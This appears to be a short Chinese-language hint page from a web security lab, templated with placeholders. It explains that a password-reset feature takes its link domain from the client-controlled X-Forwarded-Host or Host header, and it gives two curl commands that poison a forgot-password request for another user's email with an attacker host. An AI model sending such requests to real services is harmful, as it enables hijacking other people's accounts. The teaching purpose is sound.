域名是从右往左读的。所以问一句： 有没有办法让一个"别人的域名"里出现自家域名？

域名是用哪个头决定的

优先用：X-Forwarded-Host
退回用：Host

开发的想法是：这服务跑在反向代理后面，代理给的更"真实"。 但这两个头都是客户端能设的 —— 你可以自己试： 

curl -i -X POST -H 'Host: {{ evil_host }}' \
     --data-urlencode 'email=alice@corp.example' \
     '{{ url_for('forgot') }}'

curl -i -X POST -H 'X-Forwarded-Host: {{ evil_host }}' \
     --data-urlencode 'email=alice@corp.example' \
     '{{ url_for('forgot') }}'
